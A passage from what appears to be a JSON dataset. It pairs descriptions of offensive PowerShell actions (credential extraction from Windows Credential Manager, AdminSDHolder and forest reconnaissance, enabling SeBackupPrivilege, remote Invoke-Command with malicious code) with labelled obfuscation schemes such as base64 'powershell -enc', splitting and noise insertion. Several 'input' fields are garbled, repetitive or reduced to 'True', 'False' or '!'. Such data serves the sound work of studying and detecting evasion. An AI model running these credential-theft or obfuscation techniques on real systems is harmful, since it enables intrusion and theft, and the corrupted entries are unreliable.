    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check AdminSDHolder users (users that are protected from ACL changes)",
    "origin_cmd": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Extracting Credentials from Windows Credential Manager, This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic credentials.",
    "origin_cmd": "$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege: Enable SeBackupPrivilege.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege: Enable SeBackupPrivilege.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege: Enable SeBackupPrivilege.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege: Enable SeBackupPrivilege.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Enable SeBackupPrivilege",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable SeBackupPrivilege",
    "origin_cmd": "Set-SeBackupPrivilege ; Get-SeBackupPrivilege"
  },
  {
    "input": "Get basic forest info",
    "output": "Get-ForestDomain",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "!",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest information: Get basic forest information:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Take a simple forest infographic: Read: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest informationgraphic: Get basic",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "Get basic forest info",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "!",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest information: Get basic forest information:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Take a simple forest infographic: Read: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest informationgraphic: Get basic",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "Get basic forest info",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "!",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest information: Get basic forest information:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Take a simple forest infographic: Read: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest informationgraphic: Get basic",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "Get basic forest info",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "!",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest info: Get basic forest information: Get basic forest information:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": ": Take a simple forest infographic: Read: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get basic forest infographic: Get forest informationgraphic: Get basic",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get basic forest info",
    "origin_cmd": "Get-ForestDomain"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
